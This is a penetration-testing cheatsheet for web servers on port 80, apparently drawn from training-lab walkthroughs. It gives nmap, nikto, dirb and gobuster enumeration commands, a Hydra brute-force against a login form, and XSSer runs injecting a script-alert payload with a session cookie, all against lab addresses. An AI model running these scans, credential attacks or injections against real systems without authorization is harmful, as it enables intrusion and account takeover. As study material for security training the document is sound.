---
description: Cheatsheets for HTTP
---

# 80 - Pentesting HTTP

### Nmap Scripts

```bash
#Find out the version using nmap.
nmap -sV -script banner 192.30.247.3
#Running http-enum nmap script to discover interesting directories.
nmap --script http-enum -sV -p 80 10.0.28.146
#Running Header script to get the IIS server header information
nmap --script http-headers -sV -p 80 10.0.28.146
#Running http-methods script on /webdav path to discover all allowed methods.
nmap --script http-methods --script-args http-methods.url-path=/webdav/ 10.0.28.146
#Running webdav scan Nmap script to identify WebDAV installations the script uses the OPTIONS and PROPFIND methods to detect it.
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ 10.0.28.146
```

### Gathering Information

```bash
#Check what web app is hosted on the web server using curl command.
curl http://192.30.247.3/
#Check what web app is hosted on the web server using wget command.
wget "http://192.30.247.3/index"
#Running whatweb tool to find all possible information about the target server.
whatweb 10.0.29.163
#We could also use the httpie tool to gather target server information.
http 10.0.29.163
#We have found all the basic details about the target server without using the browser. We could also use browsh "A fully-modern text-based browser, rendering to TTY and browsers"
browsh --startup-url http://10.0.29.163/Default.aspx
#Check what web app is hosted on the web server using lynx CLI based browser.
lynx http://192.30.247.3
```

### Nikto

{% code overflow="wrap" %}
```bash
nikto -h http://192.230.148.3
#Check for the Remote File Retrieval in verbose mode:
nikto -h http://192.230.148.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V
#Saving the scan result as an HTML file:
nikto -h http://192.230.148.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5
-o nikto.html -Format htm
```
{% endcode %}

### dirb

{% code overflow="wrap" %}
```bash
#Enumerate server’s directories and subdirectories.
dirb http://10.0.29.163
#With custom wordlists
dirb http://192.30.247.3 /usr/share/metasploit-framework/data/wordlists/directory.txt
```
{% endcode %}

### Gobuster

{% code overflow="wrap" %}
```bash
#-u flag is used to specify the URL of the target whereas the -w flag is used to specify the wordlist with its full path.
gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt
#The -b flag is used to specify the status codes which has to be ignored
gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt -b 403,404
#-x flag is used to find the files which have the specified extensions. -r flag is used to specify to follow any redirects or 302 status code pages.
gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
# the '/data' directory is appended in the target URL. The gobuster will start scanning from the /data directory.
gobuster dir -u http://192.156.207.3/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
```
{% endcode %}

### Hydra

{% code overflow="wrap" %}
```bash
#Attacking HTTP Login Form with Hydra
hydra -L usernames.txt -P passwords.txt 192.208.137.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
#Following the form parameters is the invalid login message so that hydra knows that the credentials it tried were invalid!
```
{% endcode %}

### XSSER

{% code overflow="wrap" fullWidth="false" %}
```bash
#https://github.com/epsylon/xsser
#Trying various XSS payloads by using XSSer's “--auto” option.
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
#Using custom XSS payload.
xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
#find XSS in Authentication
xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" -- cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0"
##Using custom XSS payload.
xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0" --Fp "<script>alert(1)</script>"
```
{% endcode %}

Reference:

* [https://assets.ine.com/labs/ad-manuals/walkthrough-1889.pdf](https://assets.ine.com/labs/ad-manuals/walkthrough-1889.pdf)
* [https://assets.ine.com/labs/ad-manuals/walkthrough-1892.pdf](https://assets.ine.com/labs/ad-manuals/walkthrough-1892.pdf)
